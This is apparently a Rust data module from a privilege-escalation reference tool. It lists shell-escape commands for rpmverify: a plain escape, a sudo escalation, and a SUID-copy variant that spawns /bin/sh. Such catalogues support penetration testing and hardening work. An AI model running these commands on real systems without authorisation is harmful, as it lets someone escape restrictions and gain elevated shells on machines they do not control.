pub static BIN_NAME: &'static str = "rpmverify";
pub static SH_CODE: &'static str = r#"
    
    rpmverify --eval '%(/bin/sh 1>&2)'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo rpmverify --eval '%(/bin/sh 1>&2)'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which rpmverify) .

    ./rpmverify --eval '%(/bin/sh 1>&2)'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
